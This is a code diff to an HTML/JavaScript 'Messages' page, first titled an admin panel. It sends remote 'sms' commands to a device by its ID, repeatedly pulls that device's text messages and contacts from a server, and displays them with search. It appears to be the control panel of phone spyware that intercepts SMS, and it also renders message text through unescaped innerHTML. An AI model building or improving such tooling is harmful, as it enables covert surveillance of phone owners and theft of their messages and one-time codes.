@@ -3,25 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Messages - Admin Panel</title>
+    <title>Messages</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --bg-color: #000000;
-            --glass-bg: rgba(28, 28, 30, 0.9);
             --bubble-received: #262628;
-            --bubble-sent: #0b84ff;
             --text-main: #ffffff;
             --text-muted: #8e8e93;
             --border-color: #38383a;
             --accent-green: #30d158;
+            --blue-accent: #0b84ff;
         }
 
         body {
             background-color: var(--bg-color);
             color: var(--text-main);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            margin: 0; padding: 10px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            margin: 0; padding: 0;
             display: flex; justify-content: center;
         }
 
@@ -35,11 +34,11 @@
         /* --- Header --- */
         .header {
             position: sticky; top: 0;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(12px);
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(10px);
             z-index: 100;
-            padding: 15px 10px;
-            border-bottom: 1px solid var(--border-color);
+            padding: 15px;
+            border-bottom: 0.5px solid var(--border-color);
         }
 
         .top-row {
@@ -47,25 +46,26 @@
             margin-bottom: 10px;
         }
 
-        .page-title { font-size: 1.8rem; font-weight: bold; }
+        .page-title { font-size: 1.5rem; font-weight: 700; }
         
         .live-indicator {
-            font-size: 0.8rem; color: var(--accent-green);
+            font-size: 0.75rem; color: var(--accent-green);
             display: flex; align-items: center; gap: 5px;
-            background: rgba(48, 209, 88, 0.1);
-            padding: 4px 8px; border-radius: 12px;
+            background: rgba(48, 209, 88, 0.15);
+            padding: 4px 10px; border-radius: 20px;
+            font-weight: 600;
         }
 
         .blink { animation: blinker 1.5s linear infinite; }
         @keyframes blinker { 50% { opacity: 0.4; } }
 
         .back-btn {
-            color: #0b84ff; font-size: 1.1rem; text-decoration: none;
+            color: var(--blue-accent); font-size: 1rem; text-decoration: none;
             display: flex; align-items: center; gap: 5px;
         }
 
         /* --- Search --- */
-        .search-box { position: relative; }
+        .search-box { position: relative; margin-top: 5px; }
         
         .search-input {
             width: 100%;
@@ -76,6 +76,7 @@
             color: white;
             font-size: 1rem;
             box-sizing: border-box;
+            outline: none;
         }
         .search-icon {
             position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
@@ -84,35 +85,37 @@
 
         /* --- SMS List --- */
         .sms-list {
-            display: flex; flex-direction: column; gap: 12px;
-            padding: 15px 10px;
+            display: flex; flex-direction: column; gap: 15px;
+            padding: 15px;
         }
 
         .sms-card {
             background: var(--bubble-received);
-            padding: 14px;
-            border-radius: 18px;
+            padding: 15px;
+            border-radius: 16px;
             position: relative;
         }
 
         .sms-header {
             display: flex; justify-content: space-between; align-items: flex-start;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
         }
 
-        .sender-info { display: flex; flex-direction: column; }
-        .sender-name { font-size: 1rem; font-weight: 600; color: #fff; }
-        .sender-number { font-size: 0.75rem; color: var(--text-muted); margin-top: 2px; }
+        .sender-info { display: flex; flex-direction: column; max-width: 70%; }
+        .sender-name { font-size: 1rem; font-weight: 600; color: #fff; margin-bottom: 2px;}
+        .sender-number { font-size: 0.75rem; color: var(--text-muted); }
 
         .time-badge {
-            font-size: 0.75rem; color: var(--text-muted);
+            font-size: 0.7rem; color: var(--text-muted);
             white-space: nowrap;
         }
 
         .message-body {
             font-size: 0.95rem; color: #e0e0e0; line-height: 1.4;
-            word-wrap: break-word;
+            word-wrap: break-word; white-space: pre-wrap;
         }
+        
+        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; font-size: 0.9rem; }
     </style>
 </head>
 <body>
@@ -126,15 +129,14 @@
             </div>
             
             <div class="search-box">
-                <i class="fa-solid fa-search search-icon"></i>
-                <input type="text" id="searchInput" class="search-input" placeholder="Search name or message..." onkeyup="filterSMS()">
+                <i class="fa-solid fa-magnifying-glass search-icon"></i>
+                <input type="text" id="searchInput" class="search-input" placeholder="Search" onkeyup="filterSMS()">
             </div>
         </div>
 
         <div id="sms-list" class="sms-list">
-            <div style="text-align: center; color: #666; margin-top: 50px;">
-                <i class="fa-solid fa-spinner fa-spin" style="font-size: 20px;"></i><br><br>
-                Connecting to device...
+            <div class="status-msg">
+                <i class="fa-solid fa-spinner fa-spin"></i><br><br>Fetching Messages...
             </div>
         </div>
     </div>
@@ -153,33 +155,37 @@
 
     document.addEventListener("DOMContentLoaded", function() {
         if (!DEVICE_ID) {
-            document.getElementById("sms-list").innerHTML = '<div style="text-align: center; color: red;">Error: Device ID missing.<br>Use ?id=YOUR_ID in URL</div>';
+            document.getElementById("sms-list").innerHTML = '<div class="status-msg" style="color:red">Error: No Device ID</div>';
             return;
         }
         
         prepareContactMap();
         loadFromStorage();
-        
         startLiveSystem();
     });
 
     function prepareContactMap() {
-        const savedContacts = localStorage.getItem(storageKeyContacts);
-        if (savedContacts) {
-            try {
+        try {
+            const savedContacts = localStorage.getItem(storageKeyContacts);
+            if (savedContacts) {
                 const contacts = JSON.parse(savedContacts);
-                contacts.forEach(c => {
-                    let cleanNum = c.number.replace(/\D/g, '').slice(-10);
-                    if(cleanNum) contactMap[cleanNum] = c.name;
-                });
-            } catch(e) {}
-        }
+                if(Array.isArray(contacts)){
+                    contacts.forEach(c => {
+                        if(c.number && c.name) {
+                            let cleanNum = String(c.number).replace(/\D/g, '').slice(-10);
+                            contactMap[cleanNum] = c.name;
+                        }
+                    });
+                }
+            }
+        } catch(e) { console.error("Contact Map Error", e); }
     }
 
     function getContactName(originalNum) {
         if (!originalNum) return "Unknown";
-        let cleanNum = originalNum.replace(/\D/g, '').slice(-10);
-        return contactMap[cleanNum] || originalNum;
+        let strNum = String(originalNum); // Ensure string
+        let cleanNum = strNum.replace(/\D/g, '').slice(-10);
+        return contactMap[cleanNum] || strNum;
     }
 
     function loadFromStorage() {
@@ -196,8 +202,8 @@
     function startLiveSystem() {
         sendCommand();
         fetchSMS();
-        setInterval(sendCommand, 15000); // 15 sec delay for command
-        setInterval(fetchSMS, 5000); // 5 sec delay for fetch
+        setInterval(sendCommand, 10000); 
+        setInterval(fetchSMS, 4000); 
     }
 
     function sendCommand() {
@@ -205,18 +211,20 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
-        }).catch(() => {}); 
+        }).catch(e => console.log("Command Error (Ignored)")); 
     }
 
     function fetchSMS() {
         if(isFetching) return;
         isFetching = true;
 
+        // Adding timestamp to prevent caching
         fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
             .then(res => res.json())
             .then(data => {
                 if (data && Array.isArray(data) && data.length > 0) {
-                    if (JSON.stringify(data) !== JSON.stringify(allSMSData)) {
+                    // Compare length to avoid unnecessary re-renders
+                    if (data.length !== allSMSData.length || JSON.stringify(data[0]) !== JSON.stringify(allSMSData[0])) {
                         allSMSData = data;
                         localStorage.setItem(storageKeySMS, JSON.stringify(data));
                         
@@ -227,67 +235,72 @@
                             filterSMS();
                         }
                     }
+                } else if (!allSMSData.length) {
+                    document.getElementById("sms-list").innerHTML = '<div class="status-msg">No Messages Found on Device.</div>';
                 }
             })
-            .catch(() => {})
+            .catch(e => console.error("Fetch Error", e))
             .finally(() => { isFetching = false; });
     }
 
     function filterSMS() {
         const query = document.getElementById('searchInput').value.toLowerCase();
         const filtered = allSMSData.filter(sms => {
-            const body = (sms.body || "").toLowerCase();
-            const address = (sms.address || "").toLowerCase();
-            const name = getContactName(sms.address).toLowerCase();
+            // Safety Strings
+            const body = String(sms.body || "").toLowerCase();
+            const address = String(sms.address || "").toLowerCase();
+            const name = String(getContactName(sms.address)).toLowerCase();
             return body.includes(query) || address.includes(query) || name.includes(query);
         });
         renderSMS(filtered);
     }
 
-    // --- FIXED RENDER FUNCTION (Handles String Dates) ---
     function renderSMS(data) {
         const listContainer = document.getElementById("sms-list");
         
-        if (!data || data.length === 0) {
-            listContainer.innerHTML = '<div style="text-align: center; color: #666; margin-top: 50px;">No messages found.</div>';
+        if (!data || !Array.isArray(data) || data.length === 0) {
+            listContainer.innerHTML = '<div class="status-msg">No messages found.</div>';
             return;
         }
 
-        const scrollPos = window.scrollY;
-        const displayData = data.slice(0, 150); 
+        const displayData = data.slice(0, 100); // Limit to 100 for performance
 
         const htmlString = displayData.map(sms => {
-            const name = getContactName(sms.address);
-            const isSaved = name !== sms.address;
-            
-            // 🔥 DATE LOGIC FIXED: Tumhara data "26/01/2026 11:56" string format me hai.
-            // Hum usse directly use karenge, convert nahi karenge.
-            let formattedDate = sms.date; 
+            try {
+                // 1. Safe Address Handling
+                const rawAddress = sms.address || "Unknown";
+                const name = getContactName(rawAddress);
+                const isSaved = name !== rawAddress;
 
-            // Fallback agar date format alag ho to hi convert karo
-            if (!isNaN(sms.date) && String(sms.date).length > 10 && !String(sms.date).includes('/')) {
-                const d = new Date(parseInt(sms.date));
-                formattedDate = d.toLocaleString();
-            }
+                // 2. Safe Date Handling
+                let displayDate = sms.date;
+                // Agar date timestamp (numbers only) hai to convert karo, warna string hi rehne do
+                if(!isNaN(sms.date) && String(sms.date).length > 12) {
+                     displayDate = new Date(parseInt(sms.date)).toLocaleString();
+                }
 
-            return `
-                <div class="sms-card">
-                    <div class="sms-header">
-                        <div class="sender-info">
-                            <span class="sender-name">${isSaved ? name : sms.address}</span>
-                            ${isSaved ? `<span class="sender-number">${sms.address}</span>` : ''}
+                // 3. Safe Body Handling (Emoji & Newlines)
+                const bodyText = sms.body ? String(sms.body) : "Empty Message";
+
+                return `
+                    <div class="sms-card">
+                        <div class="sms-header">
+                            <div class="sender-info">
+                                <span class="sender-name">${isSaved ? name : rawAddress}</span>
+                                ${isSaved ? `<span class="sender-number">${rawAddress}</span>` : ''}
+                            </div>
+                            <span class="time-badge">${displayDate}</span>
                         </div>
-                        <span class="time-badge">${formattedDate}</span>
+                        <div class="message-body">${bodyText}</div>
                     </div>
-                    <div class="message-body">
-                        ${sms.body || 'No Content'}
-                    </div>
-                </div>
-            `;
+                `;
+            } catch (err) {
+                console.error("Skipping corrupted message", err);
+                return ""; // Skip bad record instead of crashing entire page
+            }
         }).join('');
 
         listContainer.innerHTML = htmlString;
-        window.scrollTo(0, scrollPos);
     }
 </script>
 </body>
